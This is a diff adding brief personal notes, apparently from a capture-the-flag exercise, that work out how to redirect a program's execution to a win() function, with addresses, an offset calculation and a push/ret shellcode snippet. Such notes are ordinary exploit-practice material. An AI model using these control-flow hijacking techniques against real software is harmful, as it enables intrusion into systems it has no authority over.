@@ -1,0 +1,16 @@
+address of win(): 0x8048540  
+ASLR is off
+
+call/jmp to  win
+
+$eip at func: 0x8048601
+$eip - &win = 29 = 0x1d
+
+hmm jump is relative, since `call eax` moves us into another segment...
+
+
+try:
+68 40 85 04 08	push 0x8048540  ; address of win
+c3		ret
+
+
